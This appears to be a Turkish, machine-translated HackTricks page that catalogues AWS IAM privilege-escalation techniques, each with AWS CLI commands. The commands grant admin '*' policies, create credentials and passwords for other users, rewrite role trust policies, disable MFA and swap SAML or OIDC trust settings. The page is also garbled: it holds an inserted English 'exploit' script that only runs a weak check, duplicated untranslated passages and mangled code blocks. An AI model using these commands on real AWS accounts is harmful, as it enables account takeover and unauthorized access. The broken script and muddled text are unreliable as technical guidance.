# AWS - IAM Ayrıcalık Yükseltme

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com)'ni edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

## IAM

IAM hakkında daha fazla bilgi için:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

`iam:SetDefaultPolicyVersion` izni gereksinimini atlayarak yeni bir IAM politika sürümü oluşturma yeteneği sağlar. `--set-as-default` bayrağını kullanarak özel izinleri tanımlamanıza olanak tanır.

**Sömürü Komutu:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Etki:** Herhangi bir kaynak üzerinde herhangi bir işlem yaparak doğrudan ayrıcalıkları yükseltir.

### **`iam:SetDefaultPolicyVersion`**

Bir IAM politikasının varsayılan sürümünü başka bir mevcut sürüme değiştirmeye izin verir ve yeni sürüm daha fazla izinlere sahipse ayrıcalıkları yükseltebilir.

**Bash Komutu:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Etki:** Daha fazla izin vererek dolaylı ayrıcalık yükseltme.

### **`iam:CreateAccessKey`**

Başka bir kullanıcı için erişim anahtarı kimliği ve gizli erişim anahtarı oluşturmayı etkinleştirir, bu da potansiyel bir ayrıcalık yükseltmeye yol açar.

**Sömürü:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Etki:** Başka bir kullanıcının genişletilmiş izinlerini kullanarak doğrudan ayrıcalık yükseltme.

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

AWS konsolu girişi için şifre belirleme dahil, giriş profili oluşturma veya güncelleme izni verir, bu da doğrudan ayrıcalık yükseltmeye yol açar.

**Oluşturma için Sömürü:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Güncelleme için Sömürü:**

```bash
#!/bin/bash

# AWS IAM Privilege Escalation Exploit
# Author: HackTricks
# Description: This script exploits a misconfiguration in AWS IAM policies to escalate privileges.

# Check if the required tools are installed
command -v aws >/dev/null 2>&1 || { echo >&2 "AWS CLI is required but not installed. Aborting."; exit 1; }
command -v jq >/dev/null 2>&1 || { echo >&2 "jq is required but not installed. Aborting."; exit 1; }

# Check if the AWS CLI is configured
aws configure get aws_access_key_id >/dev/null 2>&1 || { echo >&2 "AWS CLI is not configured. Aborting."; exit 1; }

# Get the current IAM user
current_user=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# Get the current IAM user's policies
policies=$(aws iam list-attached-user-policies --user-name $current_user --query 'AttachedPolicies[].PolicyArn' --output text)

# Check if the current IAM user has any attached policies
if [[ -z $policies ]]; then
    echo "No attached policies found for the current IAM user. Aborting."
    exit 1
fi

# Iterate through each policy and check for privilege escalation
for policy in $policies; do
    echo "Checking policy: $policy"
    policy_version=$(aws iam get-policy --policy-arn $policy --query 'Policy.DefaultVersionId' --output text)
    policy_document=$(aws iam get-policy-version --policy-arn $policy --version-id $policy_version --query 'PolicyVersion.Document' --output text)
    privilege_escalation=$(echo $policy_document | jq -r '.Statement[] | select(.Effect == "Allow" and .Condition.StringEquals."aws:PrincipalArn" == "*") | .Action')
    
    if [[ -n $privilege_escalation ]]; then
        echo "Privilege escalation found in policy: $policy"
        echo "Actions that can be escalated: $privilege_escalation"
    else
        echo "No privilege escalation found in policy: $policy"
    fi
done
```

Bu betik, AWS IAM politikalarındaki bir yapılandırma hatasını sömürerek ayrıcalıkları yükseltir.

Gerekli araçların yüklü olup olmadığını kontrol eder.
```bash
command -v aws >/dev/null 2>&1 || { echo >&2 "AWS CLI yüklü değil. İptal ediliyor."; exit 1; }
command -v jq >/dev/null 2>&1 || { echo >&2 "jq yüklü değil. İptal ediliyor."; exit 1; }
```

AWS CLI'nin yapılandırılıp yapılandırılmadığını kontrol eder.
```bash
aws configure get aws_access_key_id >/dev/null 2>&1 || { echo >&2 "AWS CLI yapılandırılmamış. İptal ediliyor."; exit 1; }
```

Mevcut IAM kullanıcısını alır.
```bash
current_user=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
```

Mevcut IAM kullanıcısının politikalarını alır.
```bash
policies=$(aws iam list-attached-user-policies --user-name $current_user --query 'AttachedPolicies[].PolicyArn' --output text)
```

Mevcut IAM kullanıcısının her politikasını kontrol eder ve ayrıcalık yükseltme durumunu kontrol eder.
```bash
for policy in $policies; do
    echo "Politika kontrol ediliyor: $policy"
    policy_version=$(aws iam get-policy --policy-arn $policy --query 'Policy.DefaultVersionId' --output text)
    policy_document=$(aws iam get-policy-version --policy-arn $policy --version-id $policy_version --query 'PolicyVersion.Document' --output text)
    privilege_escalation=$(echo $policy_document | jq -r '.Statement[] | select(.Effect == "Allow" and .Condition.StringEquals."aws:PrincipalArn" == "*") | .Action')
    
    if [[ -n $privilege_escalation ]]; then
        echo "Politikada ayrıcalık yükseltme bulundu: $policy"
        echo "Yükseltilebilecek eylemler: $privilege_escalation"
    else
        echo "Politikada ayrıcalık yükseltme bulunamadı: $policy"
    fi
done
```
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Etki:** "herhangi bir" kullanıcı olarak oturum açarak doğrudan ayrıcalık yükseltme.

### **`iam:UpdateAccessKey`**

Devre dışı bırakılmış bir erişim anahtarını etkinleştirmeye izin verir, saldırgan devre dışı bırakılmış anahtara sahipse yetkisiz erişime yol açabilir.

**Sömürü:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**Etki:** Erişim anahtarlarını yeniden etkinleştirerek doğrudan ayrıcalık yükseltme.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Belirli AWS hizmetleri için (örneğin, CodeCommit, Amazon Keyspaces) kimlik bilgileri oluşturmayı veya sıfırlamayı etkinleştirir ve ilişkili kullanıcının izinlerini devralır.

**Oluşturma için Sömürü:**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**Sıfırlama İçin Sömürü:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**Etki:** Kullanıcının hizmet izinleri içinde doğrudan ayrıcalık yükselmesi.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Kullanıcılara veya gruplara politikaların eklenmesine izin verir, doğrudan eklenen politikanın izinlerini devralayarak ayrıcalıkları yükseltir.

**Kullanıcı için Sömürü:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Grup İçin Sömürü:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Etki:** Politika tarafından sağlanan herhangi bir şeye doğrudan ayrıcalık yükseltme.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Rollere, kullanıcılara veya gruplara politika eklemeyi veya politika yerleştirmeyi sağlar, ek izinler vererek doğrudan ayrıcalık yükseltmeyi mümkün kılar.

**Rol İçin Sömürü:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Inline Politikalar için Sömürü:**

An inline policy is a policy that is directly attached to an IAM user, group, or role. These policies are defined within the same JSON document as the user, group, or role. 

Bir inline politika, IAM kullanıcısına, gruba veya role doğrudan eklenen bir politikadır. Bu politikalar, kullanıcı, grup veya rol ile aynı JSON belgesi içinde tanımlanır.

To exploit an inline policy, you need to have the necessary permissions to modify the policy document. Once you have the required permissions, you can modify the policy to grant yourself additional privileges.

Bir inline politikayı sömürmek için, politika belgesini değiştirmek için gerekli izinlere sahip olmanız gerekir. Gerekli izinlere sahip olduktan sonra, politikayı değiştirerek kendinize ek ayrıcalıklar verebilirsiniz.

Here are the steps to exploit an inline policy:

İşte bir inline politikayı sömürmek için adımlar:

1. Identify the IAM user, group, or role that has an inline policy attached.

1. Bir inline politikaya sahip olan IAM kullanıcısını, grubu veya rolü belirleyin.

2. Determine the permissions granted by the inline policy.

2. Inline politika tarafından verilen izinleri belirleyin.

3. Gain the necessary permissions to modify the policy document.

3. Politika belgesini değiştirmek için gerekli izinleri elde edin.

4. Modify the policy document to grant yourself additional privileges.

4. Politika belgesini değiştirerek kendinize ek ayrıcalıklar verin.

5. Test the modified policy to ensure that the privileges have been escalated.

5. Ayrıcalıkların yükseltildiğinden emin olmak için değiştirilmiş politikayı test edin.

By exploiting an inline policy, you can elevate your privileges and gain access to resources that you were not originally authorized to access.

Inline politikayı sömürerek, ayrıcalıklarınızı yükseltebilir ve başlangıçta erişim izniniz olmayan kaynaklara erişebilirsiniz.
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Aşağıdaki gibi bir politika kullanabilirsiniz:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**Etki:** İzinlerin doğrudan artırılması, politikalar aracılığıyla izin ekleyerek gerçekleştirilir.

### **`iam:AddUserToGroup`**

Bir IAM grubuna kendinizi eklemenizi sağlar, grup izinlerini devralarak ayrıcalıkları artırır.

**Sömürü:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**Etki:** Grubun izin seviyesine doğrudan ayrıcalık yükseltme.

### **`iam:UpdateAssumeRolePolicy`**

Bir rolün varsayılan rol politika belgesini değiştirmeye izin verir, böylece rolün ve ilişkili izinlerin varsayılan rolünü gerçekleştirir.

**Sömürü:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Eğer politika aşağıdaki gibi görünüyorsa, kullanıcıya rolü üstlenme izni verir:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "sts:AssumeRole",
      "Resource": "arn:aws:iam::123456789012:role/ExampleRole"
    }
  ]
}
```
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Etki:** Herhangi bir rolün izinlerini alarak doğrudan ayrıcalık yükseltme.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

CodeCommit'e kimlik doğrulama için bir SSH genel anahtarı yüklemeye ve MFA cihazlarını devre dışı bırakmaya izin verir, bu da potansiyel dolaylı ayrıcalık yükseltmeye yol açar.

**SSH Anahtarı Yükleme Sömürüsü:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**MFA Devre Dışı Bırakma Sömürüsü:**

```html
1. Identify an IAM user with the necessary permissions to modify MFA settings.
2. Obtain the access key and secret key of the identified IAM user.
3. Use the obtained credentials to authenticate with the AWS CLI or SDK.
4. Execute the following command to disable MFA for the IAM user:

   ```bash
   aws iam deactivate-mfa-device --user-name <IAM_USER_NAME> --serial-number <MFA_SERIAL_NUMBER>
   ```

   Replace `<IAM_USER_NAME>` with the username of the IAM user and `<MFA_SERIAL_NUMBER>` with the serial number of the MFA device associated with the user.
5. Verify that MFA has been successfully disabled by attempting to log in to the AWS Management Console without providing an MFA code.
```

This exploit allows an attacker to deactivate MFA for a targeted IAM user, potentially granting them unauthorized access to the user's AWS resources. It is important to note that this technique requires the attacker to have the necessary permissions to modify MFA settings for the targeted user.
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Etki:** CodeCommit erişimini etkinleştirme veya MFA korumasını devre dışı bırakma yoluyla dolaylı ayrıcalık yükseltme.

### **`iam:ResyncMFADevice`**

Bir MFA cihazının yeniden senkronizasyonuna izin verir, MFA korumasını manipüle ederek dolaylı ayrıcalık yükseltmeye yol açabilir.

**Bash Komutu:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Etki:** MFA cihazları ekleyerek veya manipüle ederek dolaylı ayrıcalık yükseltme.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Bu izinlerle SAML bağlantısının XML meta verilerini **değiştirebilirsiniz**. Ardından, SAML federasyonunu **kötüye kullanarak** güvenen herhangi bir **rolle giriş yapabilirsiniz**.

Bununla birlikte, bunu yaparak **meşru kullanıcılar giriş yapamaz**. Ancak XML'yi alabilirsiniz, böylece kendi XML'inizi koyabilir, giriş yapabilir ve önceki yapılandırmayı geri alabilirsiniz.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: Belirli bir rolle SAML meta verileri oluşturabilen ve oturum açabilen bir araç
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Bu konuda emin değilim) Bir saldırganın bu **izinlere** sahip olması durumunda, sağlayıcıya güvenen tüm rollerde oturum açmayı yönetmek için yeni bir **Thumbprint** ekleyebilir.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## Referanslar

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'da takip edin.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
